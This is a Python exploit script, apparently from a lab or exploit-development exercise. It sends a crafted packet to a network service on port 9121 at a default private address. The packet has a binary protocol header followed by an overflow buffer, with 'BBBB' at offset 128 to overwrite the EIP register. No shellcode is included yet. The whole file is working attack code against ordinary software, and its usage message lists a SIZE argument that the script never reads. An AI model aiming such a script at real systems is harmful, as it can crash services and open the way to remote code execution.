#!/usr/bin/env python3

import socket
import sys
from struct import pack

try:
    if len(sys.argv) < 2:
        server = "192.168.185.10"
    else:
        server = sys.argv[1]

    if len(sys.argv) < 3:
        port = 9121
    else:
        port = int(sys.argv[2])

    size = 1000
    eip_offset = 128

    print("Usage: {} [TARGET] [PORT] [SIZE]".format(sys.argv[0]))
    print("TARGET: {}".format(server))
    print("PORT: {}".format(str(port)))

    inputBuffer = b"\x41" * eip_offset
    inputBuffer += b"\x42" * 4
    inputBuffer += b"\x43" * (size - 4 - eip_offset)

    header = b"\x75\x19\xba\xab"
    header += b"\x03\x00\x00\x00"
    header += b"\x00\x40\x00\x00"
    header += pack('<I', len(inputBuffer))
    header += pack('<I', len(inputBuffer))
    header += pack('<I', inputBuffer[-1])

    buf = header + inputBuffer

    print("Sending buffer...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    s.close()

    print("Done!")

except socket.error:
    print("Could not connect!")